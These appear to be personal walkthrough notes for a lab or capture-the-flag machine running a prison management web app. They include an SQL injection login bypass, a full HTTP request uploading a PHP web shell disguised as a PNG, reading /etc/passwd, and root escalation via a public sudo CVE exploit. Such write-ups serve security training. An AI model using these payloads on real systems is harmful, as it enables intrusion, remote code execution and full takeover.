#box

*Created: 1/21/2026*

### Step 1

**Tags:** #Authentication-Bypass #Web-Applications #SQLi #Blind-SQLi

**Command:**
```sql
' or 1=1 -- - 
```

*Port: 9443*

> 
> The machine exposes on port 9443 a web application for a Prison Management System. We realize it has an Admin Dashboard and after a few tries we manage to get in by using a really basic SQLi that bypasses the authentication and gets us in as the administrator

---

### Step 2

**Tags:** #BurpSuite #Web-Applications #File-Upload-Bypass #Web-Shell

**Command:**
```http
POST /Admin/edit-photo.php HTTP/1.1
Host: 192.168.104.103:9443
Cookie: PHPSESSID=bae2jaecgqk9mc1d42s85lntbv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://192.168.104.103:9443/Admin/edit-photo.php
Content-Type: multipart/form-data; boundary=---------------------------199457814019055793091329107847
Content-Length: 373
Origin: https://192.168.104.103:9443
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

-----------------------------199457814019055793091329107847
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php system($_GET["cmd"]); ?>
-----------------------------199457814019055793091329107847
Content-Disposition: form-data; name="btnsave"

-----------------------------199457814019055793091329107847--


```

*Port: 9443*

> 
> Once authenticated, we discover on the Leave Management page a clear-text password `RonnyCache001`, however, we do not have the authentication for that user and after some bruteforce we're unable to achieve it. We opt to upload a webshell trough the upload feature of the application achieving RCE and, after reading `/etc/passwd` we realize the credentials are `vmdak:RonnyCache001` (that's the only user that has a login shell other than root)
> 
> To make the webshell work properly it's enough to update the Content-Type with burpsuite and change our php shell to `image/png`. Since the check is a very lazy check only on the Content-Type it's not even required to use magic bytes to illude the BE into thinking the file is a valid image.

---

### Step 3

**Tags:** #sudo

🔗 **URL/Link:** https://github.com/zinzloun/CVE-2025-32463

**Command:**
```bash
./CVE-2025-32463.sh
```

> 
> To escalate to root we discover that the sudo version is `1.9.15p5` and that version is vulnerable to [CVE-2025-32463](https://github.com/zinzloun/CVE-2025-32463). Thus, we copy paste the shell file and download the `.so.2` file onto the target machine inside tmp and execute it, gaining root privileges.

---

